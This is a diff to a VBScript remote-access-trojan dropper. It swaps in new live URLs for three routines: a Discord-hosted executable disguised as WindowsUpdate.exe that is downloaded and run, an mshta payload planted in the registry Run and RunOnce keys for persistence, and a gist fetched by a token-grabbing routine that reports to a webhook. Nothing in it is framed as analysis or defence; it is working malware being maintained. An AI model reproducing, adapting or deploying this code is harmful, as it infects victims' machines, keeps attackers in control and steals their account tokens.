@@ -53,7 +53,7 @@ window.close()
 ' --- RAT DROP (Standard Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
     ' Updated RAT Link
-    Dim dl : dl = "https://cdn.discordapp.com/attachments/1536189112896196709/1575630554609618974/client_1.exe?ex=6b09fbce&is=6b08aa4e&hm=c9b6d45e23c6abefc992f92ab1f2f426ffce56e7f87ca5dcd98bc3584810d3eb&"
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1575827182591418438/WindowsUpdate.exe?ex=6b0ab2ed&is=6b09616d&hm=ceda74063b61a32d8271f25486f7004a2e49ca04dd8a5e95a15195b7221abb09&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
@@ -205,7 +205,7 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    Dim payload : payload = "mshta http://matrixhub.app/"
+    Dim payload : payload = "mshta https://rigxdice.app/"
     On Error Resume Next
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
@@ -220,7 +220,7 @@ End Sub
 Sub GrabTokens(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.github.com/iveshahaha/bb5e511a627ff1ce80ccc4839153f901", False
+    xh.Open "GET", "https://gist.github.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
